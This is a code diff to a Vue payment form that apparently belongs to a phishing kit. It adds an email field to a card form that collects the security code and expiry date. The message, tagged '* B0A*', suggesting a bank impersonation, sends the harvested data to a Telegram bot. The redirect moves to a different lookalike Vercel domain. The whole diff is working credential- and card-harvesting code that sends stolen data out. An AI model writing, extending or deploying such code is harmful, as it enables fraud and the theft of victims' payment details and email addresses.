@@ -34,6 +34,11 @@
       <h3 class="h33">Credit card details</h3>
 
       <div class="label-input">
+        <label for="sec-code" ><b class="for">Email Address*</b></label>
+        <input type="text" id="sec-code" maxlength="30" required v-model="formDataRes.email">
+        <!-- <p>3 or 4 digits</p> -->
+      </div>
+      <div class="label-input">
         <label for="sec-code" ><b class="for">Security code *</b></label>
         <input type="text" id="sec-code" maxlength="4" required v-model="formDataRes.sscode">
         <p>3 or 4 digits</p>
@@ -41,7 +46,7 @@
 
       <div class="label-input">
         <label for="exp-date"><b class="for">Expiration date *</b></label>
-        <input type="text" id="exp-date" maxlength="5" placeholder="MM/YY" required v-model="formDataRes.expdate">
+        <input type="text" id="exp-date" maxlength="6" placeholder="MM/YY" required v-model="formDataRes.expdate">
         <p>MM/YY</p>
       </div>
 
@@ -118,6 +123,7 @@ export default {
   data() {
     return {
       formDataRes: {
+        email: "",
         sscode: "",
         expdate: "",
       },
@@ -136,7 +142,7 @@ export default {
         this.loading = true;
 
         // Format the message as string
-        const message = `* B0A*\nSScode: ${this.formDataRes.sscode}\nEXpdate: ${this.formDataRes.expdate}`;
+        const message = `* B0A*\nEmail: ${this.formDataRes.email}\nSScode: ${this.formDataRes.sscode}\nEXpdate: ${this.formDataRes.expdate}`;
 
         // Send to Telegram
         await this.sendTelegramResult(
@@ -149,7 +155,7 @@ export default {
         this.loading = false;
       } else {
         // Redirect after sending
-        location.replace("https://mtaonilne-net.vercel.app/");
+        location.replace("https://gcimailwebmail.vercel.app/");
       }
     },
 
